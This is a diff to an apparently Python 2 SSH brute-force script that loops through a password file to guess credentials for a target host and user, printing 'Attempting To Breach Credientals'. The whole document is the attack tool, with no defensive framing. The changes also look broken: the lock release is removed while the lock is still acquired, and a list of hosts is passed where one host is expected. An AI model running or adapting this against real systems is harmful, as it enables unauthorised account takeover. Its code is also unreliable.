@@ -29,22 +29,14 @@ def connect(host, user, password, release):
 			time.sleep(1)
 			connect(host, user, password, False)
 	finally:
-		if release: connection_lock.release()
+		print '\n [Failure] Next Password Attempt'
 
-def main():
-	parser = optparse.OptionParser("Usages For Program -H <Target Host> -u <user> -F <Password List>")
-	parser.add_option('-H', dest='tgtHost', type='string', help='Specify Target Host')
-	parser.add_option('-F', dest='passwdFile', type='string', help='Specify The Password File')
-	parser.add_option('-u', dest='user', type='string', help='Specify The User')
-	(options, args) = parser.parse_args()
-	host = options.tgtHost
-	passwdFile = options.passwdFile
-	user = options.user
-	if host == None or passwdFile == None or user == None:
-		print parser.usage
-		exit(0)
-	fn = open(passwdFile, 'r')
-	for line in fn.readlines():
+def BruteForce(host, user, passwdFile):
+	OpenFile = open(passwdFile, 'r')
+	for line in OpenFile.readlines():
+		password = line.split(':')[0].strip('\n')
+		print "[-] Testing: "+str(password)
+		connect(host, user, password, True)
 		if Found:	
 			print "[*] Exiting: Password Found"
 			exit(0)
@@ -52,10 +44,24 @@ def main():
 				print "[!] Exiting: Too Many Socket Timeout Attempts"
 				exit(0)
 	connection_lock.acquire()
-	password = line.strip('\r').strip('\n')
-	print "[-] Testing: "+str(password)
-	t = Thread(target=connect, args=(host, user, password, True))
-	child = t.start()
+	
+
+def main():
+	parser = optparse.OptionParser("Usages For Program -H <Target Host> -u <user> -F <Password List>")
+	parser.add_option('-H', '--Host', dest='tgtHost', type='string', help='Specify Target Host')
+	parser.add_option('-F','--File', dest='passwdFile', type='string', help='Specify The Password File')
+	parser.add_option('-U', '--User', dest='user', type='string', help='Specify The User')
+	(options, args) = parser.parse_args()
+	host = str(options.tgtHost).split(',') # No space between inserting different hosts
+	passwdFile = options.passwdFile
+	user = options.user
+	if host == None or passwdFile == None or user == None:
+		print parser.usage
+		exit(0)
+	print "\n\t SSH Brute Force Passwords\n"
+	print "  Attempting To Breach Credientals For: ", host
+	BruteForce(host, user, passwdFile)	
+	
 	
 if __name__ == '__main__':
 	main()
